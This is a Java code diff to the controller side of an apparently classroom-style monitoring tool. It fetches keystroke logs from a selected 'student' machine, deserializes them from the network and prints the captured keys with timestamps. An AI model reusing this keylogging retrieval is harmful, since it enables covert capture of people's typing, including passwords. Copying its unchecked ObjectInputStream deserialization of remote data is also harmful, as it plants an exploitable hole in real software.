@@ -13,6 +13,7 @@ import java.io.ObjectInputStream;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.LinkedList;
 import java.util.zip.GZIPInputStream;
 
 @Slf4j
@@ -79,6 +80,7 @@ public class KeyboardModule implements Module {
 
                 Student student = StudentManager.getFirstSelectedStudent();
                 if (student == null) return;
+                System.out.println("正在获取键盘记录, 请稍候...");
 
                 ByteBuffer buffer = ByteBuffer.allocate(2);
                 buffer.putShort(GET_KEYBOARD_RECORD);
@@ -119,29 +121,27 @@ public class KeyboardModule implements Module {
                 GZIPInputStream gzipIn = new GZIPInputStream(in);
                 ObjectInputStream objIn = new ObjectInputStream(gzipIn);
 
-                KeyboardData lastData = null;
-                boolean isEnter = false;
-
                 System.out.println("键盘记录如下(共" + len + "条记录):");
                 for (int i = 0; i < len; i++) {
                     KeyboardData data = KeyboardData.readFromStream(objIn);
-                    String key = NativeKeyEvent.getKeyText(data.key);
+                    LinkedList<Integer> keys = data.keys;
 
-                    if (key.equals("空格")) key = " ";
-                    if (key.equals("Backspace")) key = "退格";
-                    if (key.equals("Enter")) key = "\n";
+                    System.out.print(new SimpleDateFormat("[yyyy-MM-dd HH:mm:ss] ")
+                            .format(data.date));
 
-                    if (isEnter || lastData == null || Math.abs(data.date.getTime() - lastData.date.getTime()) > 2000) {
+                    for (int key : keys) {
+                        String text = NativeKeyEvent.getKeyText(key);
 
-                        String time = new SimpleDateFormat("[yyyy-MM-dd HH:mm:ss] ")
-                                .format(data.date);
-                        System.out.print("\n" + time + key);
-                    } else {
-                        System.out.print(key);
+                        text = text.replace("Enter", "\n");
+                        text = text.replace("Tab", "\t");
+                        text = text.replace("空格", " ");
+                        text = text.replace("Space", " ");
+                        text = text.replace("Backspace", "退格");
+
+                        System.out.print(text.toLowerCase());
                     }
 
-                    isEnter = key.equals("\n");
-                    lastData = data;
+                    System.out.println();
                 }
             }
 
@@ -193,10 +193,10 @@ public class KeyboardModule implements Module {
         return true;
     }
 
-    record KeyboardData(Date date, int key) {
+    record KeyboardData(Date date, LinkedList<Integer> keys) {
         public static KeyboardData readFromStream(ObjectInputStream in) throws IOException {
             try {
-                return new KeyboardData((Date) in.readObject(), in.readInt());
+                return new KeyboardData((Date) in.readObject(), (LinkedList<Integer>) in.readObject());
             } catch (ClassNotFoundException e) {
                 throw new IOException(e);
             }
